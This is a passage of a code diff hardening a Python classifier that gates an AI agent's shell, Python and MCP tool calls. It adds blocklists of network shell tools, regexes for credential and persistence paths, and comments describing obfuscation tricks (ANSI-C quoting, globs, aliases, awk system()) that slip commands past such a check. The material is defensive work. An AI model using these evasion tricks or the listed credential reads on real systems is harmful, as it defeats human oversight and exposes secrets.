@@ -122,11 +122,16 @@ _BLOCKED_COMMANDS_COMMON = frozenset(
         "netcat",
         "socat",
         "ssh",
+        "slogin",
         "scp",
         "sftp",
         "rsync",
         "eval",
         "source",
+        # `.` is the POSIX synonym for `source`: `. ./script.sh` runs the file's
+        # contents in the current shell, past a classifier that never sees them.
+        # Matched at command position only, so `find . -type f` / `cd .` are fine.
+        ".",
     }
 )
 _BLOCKED_COMMANDS_WIN = frozenset(
@@ -148,7 +153,9 @@ _BLOCKED_COMMANDS = (
 
 _SHELL_SEPARATORS = frozenset({";", "&&", "||", "|", "&", "\n", "(", ")", "`", "{", "}"})
 # Bash keywords starting a new command position (then $cmd, do $cmd, etc.).
-_SHELL_KEYWORDS_AS_SEP = frozenset({"then", "do", "else", "elif"})
+# `if`/`while`/`until` are followed by a CONDITION the shell executes, so a
+# command right after them is at command position (if rm -rf x; then :; fi).
+_SHELL_KEYWORDS_AS_SEP = frozenset({"then", "do", "else", "elif", "if", "while", "until", "!"})
 # Wrappers whose next non-flag argument is the command Bash will exec.
 _COMMAND_PREFIXES = frozenset(
     {
@@ -164,6 +171,7 @@ _COMMAND_PREFIXES = frozenset(
         "timeout",
         "ionice",
         "chroot",
+        "setpriv",
         "sudo",
         "doas",
         "su",
@@ -198,16 +206,86 @@ _AUTO_UNSAFE_ENV_ASSIGN = frozenset(
 )
 
 
-def _env_assignment_is_unsafe(name: str) -> bool:
+# A search-path entry that can shadow a real binary or module: absolute, home or
+# a parent escape. A relative entry (`PYTHONPATH=src`) points inside the session
+# workdir, the agent's own directory, and is the common spelling in ordinary work.
+_PATH_ENTRY_ESCAPES_RE = re.compile(r"(?:^|:)\s*(?:/|~|\$|[A-Za-z]:[\\/]|\.\.)")
+
+
+def _env_assignment_is_unsafe(name: str, value: str = "") -> bool:
     """True if a NAME=value prefix affects command lookup/loading."""
-    return (
-        name in _AUTO_UNSAFE_ENV_ASSIGN
-        or name.startswith(("LD_", "DYLD_"))
-        or name.endswith("PATH")
-    )
+    if name in _AUTO_UNSAFE_ENV_ASSIGN or name.startswith(("LD_", "DYLD_")):
+        return True
+    if name == "PATH":
+        # Every value counts: PATH picks the BINARY, and a relative entry is the
+        # sharpest form of that (`PATH=. ls` runs ./ls).
+        return True
+    # The other search paths (PYTHONPATH, NODE_PATH, ...) only shadow a real
+    # module when the entry escapes the workdir.
+    return name.endswith("PATH") and bool(_PATH_ENTRY_ESCAPES_RE.search(value))
 
 
+# Container CLIs start or reach into a container (docker run -v /:/host), but
+# their read subcommands are ordinary inspection and must not interrupt. An
+# unrecognised subcommand still asks, so the list can only be too small.
+_CONTAINER_CLIS = frozenset({"docker", "podman", "nerdctl", "ctr", "crictl", "lxc", "kubectl"})
+_CONTAINER_READ_SUBCOMMANDS = frozenset(
+    {
+        "ps",
+        "images",
+        "logs",
+        "inspect",
+        "version",
+        "info",
+        "stats",
+        "top",
+        "port",
+        "diff",
+        "history",
+        "search",
+        "events",
+        "ls",
+        "list",
+        "get",
+        "describe",
+        "df",
+        "help",
+        "explain",
+        "api-resources",
+        "api-versions",
+    }
+)
+# Windows `if exist FILE cmd` / `if defined VAR cmd` put an operand between the
+# keyword and the command, so the command word is two tokens along.
+# awk runs its program text, which can shell out through the system() builtin
+# or by piping to a shell ("cmd" | "sh"). Screening the program keeps ordinary
+# field work (awk '{print $1}') running while the escape hatches ask.
+_AWK_COMMANDS = frozenset({"awk", "gawk", "mawk", "nawk", "busybox-awk"})
+_AWK_SHELL_ESCAPE_RE = re.compile(
+    r"\bsystem\s*\(|\|\s*&?\s*[\"']\s*(?:/\S*/)?(?:sh|bash|zsh|ksh|dash|cmd)\b|"
+    r"\bENVIRON\s*\[|\bprintf\s*\|"
+)
+_WIN_CONDITIONAL_KEYWORDS = frozenset({"exist", "defined", "errorlevel", "not"})
 _FIND_EXEC_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
+
+# `[` and `[[` are the test builtins, not patterns.
+_TEST_BUILTINS = frozenset({"[", "[[", "]", "]]"})
+
+
+def _is_unresolved_command_glob(base: str) -> bool:
+    """Whether a command word is a glob bash expands to some other name
+    (`/bin/r[m]` runs rm). A pattern with no literal character (a bare `*`) is
+    not one, and the test builtins are not patterns."""
+    if base in _TEST_BUILTINS or not any(ch in base for ch in "*?["):
+        return False
+    return any(ch.isalnum() for ch in base)
+
+
+def _blocked_matching_glob(base: str) -> "set[str]":
+    """Blocked command names a command-position glob can expand to."""
+    if not _is_unresolved_command_glob(base):
+        return set()
+    return {name for name in _BLOCKED_COMMANDS if fnmatch.fnmatchcase(name, base)}
 
 
 def _find_blocked_commands(command: str) -> set[str]:
@@ -221,6 +299,10 @@ def _find_blocked_commands(command: str) -> set[str]:
     `find ... -exec CMD` and recurses into bash -c / cmd /c.
     """
     blocked: set[str] = set()
+
+    # Decode ANSI-C quoting first ($'ssh' -> ssh) so a blocked name hidden behind
+    # it is still detected at command position.
+    command = _decode_ansi_c(command, keep_one_word = True)
 
     # punctuation_chars splits separators into their own tokens, so command
     # position is detected even in `echo done; rm -rf x` (no whitespace).
@@ -245,8 +327,21 @@ def _find_blocked_commands(command: str) -> set[str]:
 
     expect_command = True  # start of string is a command position
     prefix_pending = False  # last cmd-position token was a wrapper (env/time/xargs/...)
+    skip_operand = False  # consume a wrapper/conditional operand, not the command
     for token in tokens:
-        if token in _SHELL_SEPARATORS or token in _SHELL_KEYWORDS_AS_SEP:
+        if skip_operand:
+            # `exec -a NAME cmd` and `if exist FILE cmd` both put an operand
+            # where the command word would otherwise be.
+            skip_operand = False
+            continue
+        if expect_command and token.lower() in _WIN_CONDITIONAL_KEYWORDS:
+            skip_operand = token.lower() != "not"
+            continue
+        if prefix_pending and token == "-a":
+            skip_operand = True
+            continue
+        # A keyword only separates where a COMMAND may start (see below).
+        if token in _SHELL_SEPARATORS or (token in _SHELL_KEYWORDS_AS_SEP and expect_command):
             expect_command = True
             prefix_pending = False
             continue
@@ -258,6 +353,9 @@ def _find_blocked_commands(command: str) -> set[str]:
             continue
         if not expect_command:
             continue
+        # A redirection may precede the command word (`</dev/null rm -rf x`).
+        if _REDIR_PREFIX_RE.match(token):
+            continue
         # FOO=bar assignment prefix; next non-assignment token is the command.
         if _ASSIGNMENT_RE.match(token):
             continue
@@ -267,6 +365,8 @@ def _find_blocked_commands(command: str) -> set[str]:
         base = _token_basename(token)
         if base in _BLOCKED_COMMANDS:
             blocked.add(base)
+        else:
+            blocked |= _blocked_matching_glob(base)
         # Wrappers (env/time/xargs/sudo) consume one command; the next non-flag,
         # non-numeric token is the real command. sudo is also in _BLOCKED_COMMANDS.
         if base in _COMMAND_PREFIXES:
@@ -275,12 +375,37 @@ def _find_blocked_commands(command: str) -> set[str]:
         expect_command = False
         prefix_pending = False
 
+    # `alias zap='rm -rf'` stores a command bash runs when the alias is invoked,
+    # so the body is scanned as a command in its own right.
+    for i, tok in enumerate(tokens):
+        if _token_basename(tok) != "alias":
+            continue
+        for nxt in tokens[i + 1 :]:
+            if nxt in _SHELL_SEPARATORS:
+                break
+            _name, _sep, _value = nxt.partition("=")
+            if _sep and _value:
+                blocked |= _find_blocked_commands(_value)
+
     # `find ... -exec CMD ... ;` and `-execdir CMD ... ;` invoke CMD directly.
     for i, tok in enumerate(tokens):
+        # The long flags carry the command attached (fd --exec=rm). Only the long
+        # spellings: a short `-x` belongs to too many other utilities (grep -x rm
+        # file) to read its neighbour as a command.
+        if "=" in tok and tok.split("=", 1)[0] in _ATTACHED_EXEC_FLAGS:
+            attached = tok.split("=", 1)[1].strip("\"'")
+            if attached:
+                attached_base = _token_basename(attached.split()[0])
+                if attached_base in _BLOCKED_COMMANDS:
+                    blocked.add(attached_base)
+                else:
+                    blocked |= _blocked_matching_glob(attached_base)
         if tok in _FIND_EXEC_FLAGS and i + 1 < len(tokens):
             base = _token_basename(tokens[i + 1])
             if base in _BLOCKED_COMMANDS:
                 blocked.add(base)
+            else:
+                blocked |= _blocked_matching_glob(base)
 
     # Regex catches blocked words at command boundaries shlex misses: inside
     # $(rm -rf), <(rm), backtick chains, or "foo;rm". Anchored to command-position
@@ -518,8 +643,22 @@ _AUTO_RECURSIVE_LISTERS = frozenset({"tree", "du"})
 # absent too: it appends arguments read from stdin that this scan never sees, so
 # `echo -o out /etc/passwd | xargs sort` forwards to `sort -o out /etc/passwd`
 # (a write + sensitive read) while only the allow-listed literals are visible.
+# setsid/exec/builtin forward to a child command just like env/nohup, so
+# classification continues at the child rather than stopping at the wrapper.
 _AUTO_SAFE_WRAPPERS = frozenset(
-    {"env", "command", "time", "timeout", "nice", "ionice", "stdbuf", "nohup"}
+    {
+        "env",
+        "command",
+        "builtin",
+        "exec",
+        "time",
+        "timeout",
+        "nice",
+        "ionice",
+        "stdbuf",
+        "nohup",
+        "setsid",
+    }
 )
 
 # MCP tools whose names look read-only auto-run; anything else asks.
@@ -552,6 +691,344 @@ _AUTO_SENSITIVE_MCP_NOUN_RE = re.compile(
     r"secret|token|credential|password|passwd|passphrase|apikey|"
     r"(?:api|access|private|secret|signing|encryption|auth|session)[_\-]?keys?"
     r")s?(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+# Split a camelCase boundary with an underscore (runCommand -> run_Command) so
+# the term-boundary MCP regexes match camelCase tool names too.
+_CAMEL_CASE_RE = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")
+# A name that reads (get_release, search_code, list_invoices) names its SUBJECT,
+# not the action, so the impact and runtime-noun patterns below must not fire on
+# it, or the everyday read tools of every server would prompt.
+_AUTO_READ_MCP_VERB_RE = re.compile(
+    r"(?:^|[_\-])(?:get|list|read|search|find|fetch|query|describe|show|view|"
+    r"inspect|status|info|count|exists|lookup|browse|preview|download|export|"
+    r"history|log|logs|diff|compare|summarize|summarise)(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+# The runtime nouns alone (python, code, script, notebook) name a subject as
+# often as an action, so they only count when nothing reads.
+_AUTO_EXEC_MCP_VERB_ONLY_RE = re.compile(
+    r"(?:^|[_\-])(?:exec|execute|run|eval|spawn|invoke|launch|shell|bash|zsh|"
+    r"powershell|pwsh|terminal|subprocess|interpreter)(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+_AUTO_EXEC_MCP_RUNTIME_NOUN_RE = re.compile(
+    r"(?:^|[_\-])(?:python[0-9.]*|node|nodejs|deno|bun|ruby|perl|php|code|"
+    r"script|repl|sandbox|notebook)(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+# An MCP tool that runs arbitrary commands/code (run_command, eval_code, bash)
+# is as unsafe as a terminal call and runs on the server, outside the terminal
+# sandbox, so auto gates it. Whole name segments only, so get_command and
+# list_shells stay read.
+_AUTO_EXEC_MCP_TOOL_RE = re.compile(
+    r"(?:^|[_\-])(?:"
+    r"exec|execute|run|eval|spawn|invoke|launch|"
+    r"shell|bash|zsh|powershell|pwsh|terminal|subprocess|interpreter|"
+    # A bare runtime name (mcp__srv__python, __node, __code) is an execution
+    # tool even without a verb: its payload runs on the MCP server.
+    r"python[0-9.]*|node|nodejs|deno|bun|ruby|perl|php|code|script|repl|sandbox|notebook"
+    r")(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+# A destructive verb as a whole name segment: an honestly-named MCP tool
+# (delete_file, delete_repo, drop_table, purge_index) runs outside the terminal
+# sandbox and causes data loss, so auto prompts on it even when the arguments
+# carry no SQL/HTTP mutation marker. Non-destructive mutations (create/update/
+# add/set/insert/patch) still run; a read that merely contains one of these as
+# a substring (undelete, list_removed) does not match on the segment boundary.
+_AUTO_DESTRUCTIVE_MCP_VERB_RE = re.compile(
+    r"(?:^|[_\-])(?:"
+    r"delete|destroy|drop|purge|wipe|truncate|erase|remove|unlink|"
+    r"teardown|revoke|terminate|uninstall|clear|reset|empty|flush|prune|expire"
+    r")(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+# A name without separators (mcp__srv__runcommand, __shellexec) never reaches the
+# segment boundaries above, so match the verb+object compounds directly.
+_MCP_EXEC_VERBS = r"execute|exec|run|eval|spawn|invoke|launch|start"
+_MCP_EXEC_OBJECTS = r"command|cmd|shell|script|code|process|program|bash|terminal|proc|task|job"
+_AUTO_EXEC_MCP_COMPOUND_RE = re.compile(
+    r"(?:^|[_\-])(?:"
+    rf"(?:{_MCP_EXEC_VERBS})(?:{_MCP_EXEC_OBJECTS})"
+    rf"|(?:{_MCP_EXEC_OBJECTS})(?:{_MCP_EXEC_VERBS})"
+    r")(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+# The verbs an MCP tool name may carry and still run without a prompt: reads, and
+# ordinary writes that create or edit a record. Destructive, privilege and
+# money-moving verbs are caught by the patterns above before this is consulted.
+_AUTO_KNOWN_MCP_VERBS = frozenset(
+    {
+        # read / inspect
+        "get",
+        "list",
+        "read",
+        "search",
+        "find",
+        "fetch",
+        "query",
+        "describe",
+        "show",
+        "view",
+        "inspect",
+        "status",
+        "info",
+        "count",
+        "exists",
+        "resolve",
+        "lookup",
+        "browse",
+        "diff",
+        "log",
+        "logs",
+        "history",
+        "summarize",
+        "summarise",
+        "analyze",
+        "analyse",
+        "validate",
+        "check",
+        "test",
+        "ping",
+        "preview",
+        "head",
+        "stat",
+        "download",
+        "export",
+        "render",
+        "format",
+        "parse",
+        "compare",
+        "explain",
+        "select",
+        "retrieve",
+        "audit",
+        "review",
+        "monitor",
+        "trace",
+        "profile",
+        "benchmark",
+        "lint",
+        "detect",
+        "classify",
+        "rank",
+        "score",
+        "predict",
+        "infer",
+        "evaluate",
+        # ordinary writes
+        "create",
+        "add",
+        "insert",
+        "update",
+        "edit",
+        "modify",
+        "set",
+        "put",
+        "patch",
+        "post",
+        "send",
+        "write",
+        "append",
+        "upload",
+        "comment",
+        "assign",
+        "label",
+        "tag",
+        "move",
+        "rename",
+        "copy",
+        "clone",
+        "sync",
+        "merge",
+        "close",
+        "reopen",
+        "open",
+        "start",
+        "stop",
+        "pause",
+        "resume",
+        "cancel",
+        "schedule",
+        "notify",
+        "register",
+        "save",
+        "store",
+        "apply",
+        "submit",
+        "request",
+        "generate",
+        "convert",
+        "translate",
+        "complete",
+        "index",
+        "ingest",
+        "embed",
+        "train",
+        "call",
+        "load",
+        "init",
+        "configure",
+        "config",
+        "upsert",
+        "retry",
+        "replay",
+        "approve",
+        "reject",
+        "acknowledge",
+        "annotate",
+        "draft",
+        "subscribe",
+        "watch",
+        "listen",
+        "poll",
+        "wait",
+        "sleep",
+        # browser / ui drivers
+        "navigate",
+        "click",
+        "type",
+        "scroll",
+        "hover",
+        "press",
+        "screenshot",
+        "capture",
+        "snapshot",
+        "extract",
+        "crawl",
+        "scrape",
+        "fill",
+        "focus",
+        # data shaping
+        "sort",
+        "filter",
+        "group",
+        "aggregate",
+        "split",
+        "chunk",
+        "tokenize",
+        "encode",
+        "decode",
+        "hash",
+        "sign",
+        "verify",
+        "compress",
+        "decompress",
+        "dedupe",
+        "normalize",
+        "normalise",
+        "sanitize",
+        "sanitise",
+        "redact",
+        "mask",
+        "compute",
+        "calculate",
+        "solve",
+        "simulate",
+        "plot",
+        "chart",
+        # build / ship
+        "build",
+        "compile",
+        "bundle",
+        "package",
+        "backup",
+        "restore",
+        "ask",
+        "answer",
+        "chat",
+        "prompt",
+        "respond",
+        "reply",
+        "transcribe",
+    }
+)
+
+
+# Verbs the patterns above already gate. A name carrying one is still screenable
+# even though reaching this point means it did not match: `undelete` is the
+# reverse of a verb this classifier knows.
+_AUTO_GATED_MCP_VERBS = frozenset(
+    {
+        "delete",
+        "remove",
+        "drop",
+        "destroy",
+        "purge",
+        "wipe",
+        "truncate",
+        "clear",
+        "reset",
+        "empty",
+        "flush",
+        "prune",
+        "expire",
+        "revoke",
+        "grant",
+        "authorize",
+        "authorise",
+        "elevate",
+        "escalate",
+        "impersonate",
+        "promote",
+        "transfer",
+        "payout",
+        "charge",
+        "refund",
+        "publish",
+        "deploy",
+        "release",
+        "install",
+        "uninstall",
+        "lock",
+        "mount",
+    }
+)
+_AUTO_MCP_VERB_VOCAB = _AUTO_KNOWN_MCP_VERBS | _AUTO_GATED_MCP_VERBS
+
+
+def _mcp_verb_is_known(tool_name: str) -> bool:
+    """Whether any term of an MCP tool name is a verb this classifier knows.
+    A name with none of them cannot be screened, so the caller fails closed."""
+    for part in re.split(r"[_\-]+", tool_name.lower()):
+        if not part:
+            continue
+        if part in _AUTO_KNOWN_MCP_VERBS:
+            return True
+        # The reverse or the repeat of a recognised verb (undelete, reopen,
+        # resend) is just as screenable as the verb itself.
+        for prefix in ("un", "re"):
+            if part.startswith(prefix) and part[len(prefix) :] in _AUTO_MCP_VERB_VOCAB:
+                return True
+    return False
+
+
+# Privilege escalation over MCP: granting a role/permission/policy hands out
+# access the operator never approved. An unambiguous privilege verb matches on
+# its own; the soft verbs below (assign/add/set/attach/bind) only count next to a
+# privilege noun, so assign_issue / add_label keep running.
+_AUTO_PRIVILEGE_MCP_VERB_RE = re.compile(
+    r"(?:^|[_\-])(?:grant|authorize|authorise|elevate|escalate|impersonate|sudo|promote)(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+# Money movement and other irreversible external side effects: an MCP call
+# that pays, refunds, wires or transfers funds cannot be undone by the
+# operator, so it asks even though it is not "destructive" in the fs sense.
+_AUTO_HIGH_IMPACT_MCP_RE = re.compile(
+    r"(?:^|[_\-])(?:transfer|payout|payment|pay|charge|refund|wire|remit|"
+    r"withdraw|deposit|invoice|subscription|subscriptions|billing|"
+    r"publish|deploy|release)(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+_AUTO_PRIVILEGE_MCP_NOUN_RE = re.compile(
+    r"(?:^|[_\-])(?:role|roles|permission|permissions|privilege|privileges|acl|acls|"
+    r"policy|policies|scope|scopes|grant|grants|membership|member|members|"
+    r"collaborator|collaborators|admin|owner)(?:[_\-]|$)",
+    re.IGNORECASE,
+)
+_AUTO_PRIVILEGE_MCP_SOFT_VERB_RE = re.compile(
+    r"(?:^|[_\-])(?:assign|add|set|attach|bind|put|update|create)(?:[_\-]|$)",
     re.IGNORECASE,
 )
 
@@ -786,12 +1263,49 @@ _PY_WRITE_MODE_RE = re.compile(r"[wax+]")
 # A file-mode literal ("w", "rb", "a+"): letters/flags only, no path chars.
 # Used to tell a Path.open("w") mode from a ZipFile.open("name.txt") filename.
 _PY_MODE_LITERAL_RE = re.compile(r"^[rwxa][btru+]*$")
+# Destructive filesystem calls in the python tool pair with the terminal `rm`
+# gate, so auto prompts. `rmtree`/`unlink`/`rmdir`/`removedirs` name only fs
+# deletion, so any receiver counts; `remove` is gated on the `os` module alone so
+# a benign list.remove() stays out. A bare import binding is caught separately.
+_PY_DESTRUCTIVE_FS_ATTRS = frozenset({"unlink", "rmtree", "rmdir", "removedirs"})
+# psutil ends a process exactly as os.kill does, which is already gated.
+_PY_PROCESS_KILL_ATTRS = frozenset({"kill", "terminate", "send_signal", "suspend"})
+_PY_PROCESS_MODULES = frozenset({"psutil"})
+# Gated only on the os module (or an alias) so a truncate/remove-like method on
+# another receiver stays out. os.truncate zeroes a file like the gated terminal
+# `truncate`; os.kill/os.killpg terminate like the blocked `kill`.
+_PY_DESTRUCTIVE_FS_OS_ATTRS = frozenset({"remove", "truncate", "ftruncate", "kill", "killpg"})
+_PY_DESTRUCTIVE_FS_IMPORT_NAMES = frozenset(
+    {
+        "remove",
+        "unlink",
+        "rmtree",
+        "rmdir",
+        "removedirs",
+        "truncate",
+        "ftruncate",
+        "kill",
+        "killpg",
+    }
+)
+# Modules whose destructive names are the same calls: posix/nt are os's
+# platform twins (from posix import unlink; nt.remove(...)).
+_PY_DESTRUCTIVE_FS_MODULES = ("os", "posix", "nt", "shutil", "pathlib")
 
 # Reading these off the host escapes the intent of "read-only is safe": they
 # hold credentials. Path traversal (../) escapes the per-session workdir.
 _SENSITIVE_PATH_RE = re.compile(
     r"(?:^|[/\\])\.(?:ssh|aws|azure|gnupg|docker|kube|config/gcloud|config/gh)(?:[/\\]|$)"
     r"|\.(?:netrc|npmrc|pypirc|git-credentials|env)(?:$|[/\\.\s'\"])"
+    # User-level persistence: a write into a shell startup file or an XDG
+    # autostart/user-service dir runs on the next login, the /etc boot-hook risk
+    # without root, and the sandbox does not confine absolute paths (>> ~/.bashrc
+    # reaches the real file). Rarely read in a dev session, so gating any
+    # reference does not over-prompt.
+    r"|(?:^|[/\\\s'\"=])\.(?:bashrc|bash_profile|bash_login|bash_logout|bash_aliases"
+    r"|profile|zshrc|zprofile|zshenv|zlogin|zlogout|kshrc|cshrc|tcshrc|login"
+    r"|xprofile|xinitrc|xsession)(?:$|[/\\\s'\"])"
+    r"|(?:^|[/\\])\.config[/\\](?:autostart|systemd[/\\]user|environment\.d)(?:[/\\]|$)"
     r"|id_rsa|id_ed25519|id_ecdsa|id_dsa"
     # Hugging Face stores the login token at ~/.cache/huggingface/token and the
     # legacy ~/.huggingface/token (plus the multi-token store stored_tokens); the
@@ -799,8 +1313,14 @@ _SENSITIVE_PATH_RE = re.compile(
     # optional leading dot covers the .huggingface dotdir form.
     r"|(?:^|[/\\])\.?huggingface[/\\](?:token|stored_tokens)(?:$|[/\\.\s'\"])"
     # /etc/ssh holds the host private keys (ssh_host_*_key); the whole dir is
-    # sensitive, not just passwd/shadow/sudoers.
-    r"|credentials|/etc/(?:passwd|shadow|sudoers|ssh(?:[/\\]|$))"
+    # sensitive, not just passwd/shadow/sudoers. The trailing group is the system
+    # persistence set: a write there (tee /etc/ld.so.preload, a drop into
+    # /etc/cron.d or /etc/systemd) installs a boot/login/preload hook, and the
+    # sandbox keeps host-fs access. Effectively write-only in a dev session, so
+    # gating any reference does not over-prompt.
+    r"|credentials|/etc/(?:passwd|shadow|sudoers|ssh(?:[/\\]|$)"
+    r"|cron[^/\\]*(?:[/\\]|$)|profile\.d(?:[/\\]|$)|systemd(?:[/\\]|$)"
+    r"|ld\.so\.preload(?:$|[/\\.\s'\"])|ld\.so\.conf|rc\.local|init\.d(?:[/\\]|$))"
     # Bash opens /dev/tcp/host/port and /dev/udp/host/port as network sockets,
     # so a redirection to one reaches the network without the confirm prompt.
     r"|/dev/(?:tcp|udp)/"
@@ -930,9 +1450,18 @@ _BRACE_ANY_RE = re.compile(r"\{[^{}]*,[^{}]*\}|\{[^{}]+\.\.[^{}]+(?:\.\.-?\d+)?\
 _SHELL_PARAM_OP_RE = re.compile(r"\$\{[A-Za-z_]\w*:?[-=+]([^{}]*)\}")
 
 
+# The credential-path pattern is superlinear in the text length and a real path
+# is short, so text far past any real path fails closed: the caller asks rather
+# than spending unbounded time. Ordinary commands are far below these bounds.
+_MAX_PATH_SCAN_CHARS = 2048
+_MAX_TERMINAL_SCAN_CHARS = 4096
+
+
 def _references_sensitive_path(text: str) -> bool:
     """True if a command or string literal reads a credential path or escapes
     the sandbox workdir via parent traversal."""
+    if len(text) > _MAX_PATH_SCAN_CHARS:
+        return True
     norm = _REDUNDANT_SLASH_RE.sub("", text)
     debracket = _GLOB_BRACKET_RE.sub(lambda m: m.group(1)[0], text)
     return bool(
@@ -1038,16 +1567,47 @@ def _expand_param_defaults(command: str) -> str:
     return _SHELL_PARAM_OP_RE.sub(lambda m: m.group(1), command)
 
 
-def _decode_ansi_c(command: str) -> str:
+# Bash expands $'...' to a single word, so a separator inside it is data. Callers
+# that tokenize the decoded text neutralize these first, otherwise
+# `printf '%s' $'a\\nrm -rf x'` reads as two commands and the printf is refused.
+_ANSI_C_SEPARATOR_RE = re.compile(r"[\s;&|()<>`]")
+
+
+def _folded_str_literal(node) -> "str | None":
+    """The string an expression evaluates to when built only from string literals
+    ("un" + "link", f"un{'link'}"), else None. Resolves a name spelled
+    dynamically but fully known at parse time."""
+    if isinstance(node, ast.Constant):
+        return node.value if isinstance(node.value, str) else None
+    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
+        left = _folded_str_literal(node.left)
+        right = _folded_str_literal(node.right)
+        return None if left is None or right is None else left + right
+    if isinstance(node, ast.JoinedStr):
+        parts = []
+        for value in node.values:
+            piece = _folded_str_literal(value)
+            if piece is None:
+                return None
+            parts.append(piece)
+        return "".join(parts)
+    if isinstance(node, ast.FormattedValue) and node.format_spec is None:
+        return _folded_str_literal(node.value)
+    return None
+
+
+def _decode_ansi_c(command: str, *, keep_one_word: bool = False) -> str:
     """Decode bash ANSI-C quoted words (cat $'/etc/pass\\x77d' -> cat /etc/passwd)
     so an escape-obfuscated path is visible to the scan. Fail-open: only adds
-    detections."""
+    detections. With ``keep_one_word`` the decoded text cannot introduce new
+    shell syntax, which is what bash does with it."""
 
     def dec(m):
         try:
-            return bytes(m.group(1), "utf-8").decode("unicode_escape")
+            text = bytes(m.group(1), "utf-8").decode("unicode_escape")
         except (UnicodeDecodeError, ValueError):
             return m.group(0)
+        return _ANSI_C_SEPARATOR_RE.sub("_", text) if keep_one_word else text
 
     return _ANSI_C_RE.sub(dec, command)
 
@@ -1392,6 +1952,20 @@ def _folded_is_sensitive(folded) -> bool:
     )
 
 
+def _command_references_sensitive(command: str) -> bool:
+    """True if a shell command reads/writes a credential path or escapes the
+    sandbox workdir (../), after undoing the shell expansions that would hide it:
+    quotes/backslash escapes, brace/parameter/ANSI-C expansion and NAME=value
+    prefixes, so `cat /et\\c/passwd`, `p="/proc/$PPID"; cat $p/environ` and
+    `cat /e{t,}c/pass?d` are all caught."""
+    stripped = _SHELL_QUOTE_RE.sub("", command).replace("\\", "")
+    candidates = []
+    for c in (command, stripped, _decode_ansi_c(command)):
+        c_param = _expand_param_defaults(c)
+        candidates.extend((c, c_param, _expand_braces(c_param), _expand_shell_assignments(c_param)))
+    return any(_glob_hits_sensitive(c) or _references_sensitive_path(c) for c in candidates)
+
+
 def _terminal_is_potentially_unsafe(command: str) -> bool:
     """Classify a terminal command for auto mode (fail closed)."""
     if not command or not command.strip():
@@ -1401,21 +1975,8 @@ def _terminal_is_potentially_unsafe(command: str) -> bool:
     if ">" in command or "`" in command or "$(" in command or "<(" in command:
         return True
     # Reads that escape the sandbox workdir (../) or hit credential paths are
-    # not "safe" reads; ask before running them. Strip shell quotes/backslash
-    # escapes and expand NAME=value prefixes first so `cat /proc/$PPID/enviro''n`,
-    # `cat /et\c/passwd`, and `p="/proc/$PPID"; cat $p/environ` are caught too.
-    stripped = _SHELL_QUOTE_RE.sub("", command).replace("\\", "")
-    # Bash applies brace/parameter/ANSI-C expansion after this classifier, so a
-    # path split across a brace group (/etc/pass{w,}d), a default/substring param
-    # (${x:-wd}, ${p:0:6}), or an escape ($'...') is invisible to the raw scan;
-    # expand first (ANSI-C decoded from the raw command, before backslash strip).
-    candidates = []
-    for c in (command, stripped, _decode_ansi_c(command)):
-        c_param = _expand_param_defaults(c)
-        candidates.extend((c, c_param, _expand_braces(c_param), _expand_shell_assignments(c_param)))
-    # Run both the literal and glob-sensitive scans over every candidate, so a
-    # brace-expanded glob (cat /e{t,}c/pass?d -> /etc/pass?d) is caught.
-    if any(_glob_hits_sensitive(c) or _references_sensitive_path(c) for c in candidates):
+    # not "safe" reads; ask before running them.
+    if _command_references_sensitive(command):
         return True
     # Newlines (and CR) separate commands in a shell but read as plain
     # whitespace to shlex, which would demote "ls\nrm x" to argument position.
@@ -1472,7 +2033,7 @@ def _terminal_is_potentially_unsafe(command: str) -> bool:
         # purely of separator characters still separates commands.
         if (
             token in _SHELL_SEPARATORS
-            or token in _SHELL_KEYWORDS_AS_SEP
+            or (token in _SHELL_KEYWORDS_AS_SEP and expect_command)
             or not set(token) - set(";&|()")
         ):
             expect_command = True
@@ -2221,22 +2782,45 @@ _MCP_METADATA_HOST_RE = re.compile(
 )
 
 
+# Argument names that carry a credential outward regardless of their value.
+_MCP_CREDENTIAL_KEY_RE = re.compile(
+    r"^(?:authorization|proxy-authorization|cookie|set-cookie|"
+    r"x-api-key|api[-_]?key|apikey|x-auth-token|auth[-_]?token|access[-_]?token|"
+    r"refresh[-_]?token|id[-_]?token|bearer|private[-_]?key|secret[-_]?key|"
+    r"client[-_]?secret|password|passwd|session[-_]?token)$",
+    re.IGNORECASE,
+)
+
+
 def _mcp_arguments_reference_sensitive(arguments) -> bool:
     """True if any string in an MCP call's arguments names a credential path, a
     credential/secret environment variable (get_env {"name": "OPENAI_API_KEY"}),
     or a cloud-metadata host (fetch_url {"url": "http://169.254.169.254/..."})."""
 
-    def walk(value) -> bool:
+    def key_is_credential(key) -> bool:
+        return isinstance(key, str) and bool(_MCP_CREDENTIAL_KEY_RE.match(key.strip()))
+
+    def walk(value, is_prose: bool = False) -> bool:
         if isinstance(value, str):
+            # A path can be carried under any argument name, so prose keys are
+            # skipped rather than path keys allowlisted: an issue body mentioning
+            # a credential file is text to store, not a file to open.
+            if is_prose:
+                return False
             return (
                 _references_sensitive_path(value)
                 or bool(_AUTO_SENSITIVE_MCP_NOUN_RE.search(value))
                 or bool(_MCP_METADATA_HOST_RE.search(value))
             )
         if isinstance(value, dict):
-            return any(walk(v) for v in value.values())
+            if any(key_is_credential(k) for k in value):
+                return True
+            return any(
+                walk(v, is_prose or (isinstance(k, str) and k.lower() in _MCP_PROSE_KEYS))
+                for k, v in value.items()
+            )
         if isinstance(value, (list, tuple)):
-            return any(walk(v) for v in value)
+            return any(walk(v, is_prose) for v in value)
         return False
 
     return walk(arguments)
@@ -2344,14 +2928,69 @@ _MUTATING_HTTP_METHODS = frozenset({"POST", "PUT", "PATCH", "DELETE"})
 _HTTP_METHOD_KEYS = frozenset({"method", "http_method", "httpmethod", "verb", "http_verb"})
 
 
+# Argument names that carry free text the tool stores or displays rather than
+# acts on, so a path or a statement mentioned inside them is a mention.
+_MCP_PROSE_KEYS = frozenset(
+    {
+        "text",
+        "body",
+        "message",
+        "msg",
+        "description",
+        "comment",
+        "content",
